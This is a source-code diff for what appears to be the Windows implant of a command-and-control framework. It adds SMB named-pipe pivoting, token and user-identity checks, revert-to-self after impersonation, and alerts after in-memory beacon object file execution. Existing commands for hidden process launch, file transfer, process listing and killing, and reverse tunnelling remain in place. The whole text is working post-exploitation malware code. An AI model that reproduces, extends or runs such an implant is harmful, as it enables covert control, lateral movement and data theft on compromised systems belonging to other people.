@@ -15,7 +15,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 	*inPacker = Packer( recv, recvSize );
 
 	ULONG packerSize = inPacker->Unpack32();
-	while ( packerSize + 4 > inPacker->GetDataSize())
+	while ( packerSize + 4 > inPacker->datasize())
 	{	
 		ULONG CommandId = inPacker->Unpack32();
 		switch ( CommandId )
@@ -39,13 +39,22 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 			this->CmdDownloadState(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_EXEC_BOF:
-			this->CmdExecBof(CommandId, inPacker, outPacker); break;
+			this->CmdExecBof(CommandId, inPacker, outPacker); 
+			if (bofImpersonate != 1)
+				this->AlertImpersonated(outPacker);
+			break;
+
+		case COMMAND_GETUID:
+			this->CmdGetUid(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_JOBS_LIST:
 			this->CmdJobsList(CommandId, inPacker, outPacker); break;
 			
 		case COMMAND_JOBS_KILL:
 			this->CmdJobsKill(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_LINK:
+			this->CmdLink(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_LS:
 			this->CmdLs(CommandId, inPacker, outPacker); break;
@@ -55,6 +64,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_MKDIR:
 			this->CmdMkdir(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_PIVOT_EXEC:
+			this->CmdPivotExec(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_PROFILE:
 			this->CmdProfile(CommandId, inPacker, outPacker); break;
@@ -70,6 +82,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 
 		case COMMAND_PWD:       
 			this->CmdPwd(CommandId, inPacker, outPacker); break;
+
+		case COMMAND_REV2SELF:
+			this->CmdRev2Self(CommandId, inPacker, outPacker); break;
 
 		case COMMAND_RM:
 			this->CmdRm(CommandId, inPacker, outPacker); break;
@@ -95,6 +110,9 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		case COMMAND_TUNNEL_REVERSE:
 			this->CmdTunnelMsgReverse(CommandId, inPacker, outPacker); break;
 
+		case COMMAND_UNLINK:
+			this->CmdUnlink(CommandId, inPacker, outPacker); break;
+
 		case COMMAND_UPLOAD:
 			this->CmdUpload(CommandId, inPacker, outPacker); break;
 
@@ -104,6 +122,8 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 		default: break;
 		}
 	}
+	if (inPacker)
+		MemFreeLocal((LPVOID*) &inPacker, sizeof(Packer));
 }
 
 void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -207,7 +227,7 @@ void Commander::CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack8(TRUE);
 		
 		ULONG count = 0;
-		ULONG indexCount = outPacker->GetDataSize();
+		ULONG indexCount = outPacker->datasize();
 		outPacker->Pack32(0);
 
 		for (char drive = 'A'; drive <= 'Z'; ++drive) {
@@ -288,22 +308,55 @@ void Commander::CmdDownloadState(ULONG commandId, Packer* inPacker, Packer* outP
 void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG entrySize = 0;
-	BYTE* entry = inPacker->UnpackBytes(&entrySize);
-	ULONG bofSize  = 0;
-	BYTE* bof      = inPacker->UnpackBytes(&bofSize);
-	ULONG argsSize = 0;
-	BYTE* args     = inPacker->UnpackBytes(&argsSize);
-	ULONG taskId   = inPacker->Unpack32();
+	BYTE* entry     = inPacker->UnpackBytes(&entrySize);
+	ULONG bofSize   = 0;
+	BYTE* bof       = inPacker->UnpackBytes(&bofSize);
+	ULONG argsSize  = 0;
+	BYTE* args      = inPacker->UnpackBytes(&argsSize);
+	ULONG taskId    = inPacker->Unpack32();
 
 	Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
-	if (bofPacker->GetDataSize() > 8) {
-		outPacker->PackFlatBytes(bofPacker->GetData(), bofPacker->GetDataSize());
-	}
+	if (bofPacker->datasize() > 8)
+		outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
 
 	outPacker->Pack32(taskId);
 	outPacker->Pack32(commandId);
 
-	bofPacker->Clear();
+	bofPacker->Clear(TRUE);
+
+}
+
+void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+
+	BOOL  result       = FALSE;
+	BOOL  elevated     = FALSE;
+	CHAR* username     = (CHAR*) MemAllocLocal(512);
+	ULONG usernameSize = 512;
+	CHAR* domain       = (CHAR*) MemAllocLocal(512);
+	ULONG domainSize   = 512;
+
+	HANDLE TokenHandle = TokenCurrentHandle();
+	if (TokenHandle)
+		result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
+
+	if (result) {
+		outPacker->Pack8(FALSE);
+		outPacker->Pack8(elevated);
+		outPacker->PackStringA(domain);
+		outPacker->PackStringA(username);
+	}
+	else {
+		outPacker->Pack32(COMMAND_ERROR);
+		outPacker->Pack32(TEB->LastErrorValue);
+	}
+
+	MemFreeLocal( (LPVOID*)&username, 512);
+	MemFreeLocal( (LPVOID*)&domain, 512);
 }
 
 void Commander::CmdJobsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -350,6 +403,22 @@ void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker
 	outPacker->Pack32(jobId);
 }
 
+void Commander::CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pivotType = inPacker->Unpack32();
+
+	DWORD BytesSize = 0;
+	PVOID Output = NULL;
+
+	if (pivotType == PIVOT_TYPE_SMB) {
+		ULONG pipeSize = 0;
+		CHAR* pipe     = (CHAR*)inPacker->UnpackBytes(&pipeSize);
+		ULONG taskId   = inPacker->Unpack32();
+
+		this->agent->pivotter->LinkPivotSMB(taskId, commandId, pipe, outPacker);
+	}
+}
+
 void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pathSize = 0;
@@ -387,7 +456,7 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->PackStringA(fullpath);
 
 		ULONG count = 0;
-		ULONG indexCount = outPacker->GetDataSize();
+		ULONG indexCount = outPacker->datasize();
 		outPacker->Pack32(0);
 
 		do {
@@ -461,6 +530,16 @@ void Commander::CmdMv(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 }
 
+void Commander::CmdPivotExec(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pivotId  = inPacker->Unpack32();
+	ULONG dataSize = 0;
+	BYTE* data     = inPacker->UnpackBytes(&dataSize);
+	ULONG taskId   = inPacker->Unpack32();
+
+	this->agent->pivotter->WritePivot(pivotId, data, dataSize);
+}
+
 void Commander::CmdProfile(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG subcommand = inPacker->Unpack32();
@@ -505,7 +584,7 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	NTSTATUS NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &spiSize);
 	if (!NT_SUCCESS(NtStatus)) {
 		spiSize += 0x1000;
-		spi = (PSYSTEM_PROCESS_INFORMATION)MemAllocLocal(spiSize);
+		spi = (PSYSTEM_PROCESS_INFORMATION) MemAllocLocal(spiSize);
 		if (spi)
 			NtStatus = ApiNt->NtQuerySystemInformation(SystemProcessInformation, spi, spiSize, &spiSize);
 	}
@@ -514,7 +593,7 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	if (NT_SUCCESS(NtStatus)) {
 		outPacker->Pack8(TRUE);
 		ULONG count = 0;
-		ULONG indexCount = outPacker->GetDataSize();
+		ULONG indexCount = outPacker->datasize();
 		outPacker->Pack32(0);
 
 		DWORD accessMask = 0;
@@ -548,31 +627,8 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 					arch64 = (piWow64 == 0);
 
 				NtStatus = ApiNt->NtOpenProcessToken(hProcess, TOKEN_QUERY, &hToken);
-				if (NT_SUCCESS(NtStatus)) {
-
-					if (hToken) {
-						LPVOID tokenInfo = NULL;
-						DWORD  tokenInfoSize = 0;
-						result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, 0, &tokenInfoSize);
-						if (!result) {
-							tokenInfo = MemAllocLocal(tokenInfoSize);
-							if (tokenInfo)
-								result = ApiWin->GetTokenInformation(hToken, TokenUser, tokenInfo, tokenInfoSize, &tokenInfoSize);
-						}
-
-						TOKEN_ELEVATION Elevation = { 0 };
-						DWORD eleavationSize = sizeof(TOKEN_ELEVATION);
-						ApiWin->GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &eleavationSize);
-
-						if (result) {
-							SID_NAME_USE SidType;
-							result = ApiWin->LookupAccountSidA(NULL, ((PTOKEN_USER)tokenInfo)->User.Sid, username, &usernameSize, domain, &domainSize, &SidType);
-							if (result) {
-								elevated = Elevation.TokenIsElevated;
-							}
-						}
-					}
-				}
+				if (NT_SUCCESS(NtStatus))
+					result = TokenToUser(hToken, username, &usernameSize, domain, &domainSize, &elevated);
 			}
 
 			if (spi->ImageName.Buffer) {
@@ -618,6 +674,18 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack8(TRUE);
 		outPacker->Pack32(87);
 	}
+}
+
+void Commander::CmdRev2Self(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG taskId = inPacker->Unpack32();
+
+	outPacker->Pack32(taskId);
+	outPacker->Pack32(commandId);
+
+	ApiWin->RevertToSelf();
+
+	outPacker->Pack8(TRUE);
 }
 
 void Commander::CmdPsKill(ULONG commandId, Packer* inPacker, Packer* outPacker)
@@ -667,7 +735,6 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	spi.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
 	spi.wShowWindow = SW_HIDE;
 
-
 	HANDLE pipeRead  = NULL;
 	HANDLE pipeWrite = NULL;
 	if (progOutput) {
@@ -680,6 +747,7 @@ void Commander::CmdPsRun(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	}
 
 	BOOL result = ApiWin->CreateProcessA(prog, progArgs, NULL, NULL, TRUE, progState | CREATE_NO_WINDOW, NULL, NULL, &spi, &pi);
+
 
 	if (result) {
 		JobData job = agent->jober->CreateJobData(taskId, JOB_TYPE_PROCESS, JOB_STATE_RUNNING, pi.hProcess, pi.dwProcessId, pipeRead, pipeWrite);
@@ -823,6 +891,14 @@ void Commander::CmdTunnelMsgReverse(ULONG commandId, Packer* inPacker, Packer* o
 	this->agent->proxyfire->ConnectMessageReverse(tunnelId, port, outPacker);
 }
 
+void Commander::CmdUnlink(ULONG commandId, Packer* inPacker, Packer* outPacker)
+{
+	ULONG pivotId = inPacker->Unpack32();
+	ULONG taskId  = inPacker->Unpack32();
+
+	this->agent->pivotter->UnlinkPivot(taskId, commandId, pivotId, outPacker);
+}
+
 void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG memoryId = inPacker->Unpack32();
@@ -863,6 +939,48 @@ void Commander::CmdUpload(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(2);
 	}
 	agent->memorysaver->RemoveMemoryData(memoryId);
+}
+
+
+
+void Commander::AlertImpersonated(Packer* outPacker)
+{
+	if (bofImpersonate == 1)
+		return;
+
+	if (bofImpersonate == 2) {
+
+		BOOL  result = FALSE;
+		BOOL  elevated = FALSE;
+		CHAR* username = (CHAR*)MemAllocLocal(512);
+		ULONG usernameSize = 512;
+		CHAR* domain = (CHAR*)MemAllocLocal(512);
+		ULONG domainSize = 512;
+
+		HANDLE TokenHandle = TokenCurrentHandle();
+		if (TokenHandle)
+			result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
+
+		if (result) {
+			outPacker->Pack32(0);
+
+			outPacker->Pack32(COMMAND_GETUID);
+
+			outPacker->Pack8(TRUE);
+			outPacker->Pack8(elevated);
+			outPacker->PackStringA(domain);
+			outPacker->PackStringA(username);
+		}
+
+		MemFreeLocal((LPVOID*)&username, 512);
+		MemFreeLocal((LPVOID*)&domain, 512);
+	} 
+	else {
+		outPacker->Pack32(0);
+		outPacker->Pack32(COMMAND_REV2SELF);
+		outPacker->Pack8(TRUE);
+	}
+	bofImpersonate = 1;
 }
 
 void Commander::CmdSaveMemory(ULONG commandId, Packer* inPacker, Packer* outPacker)
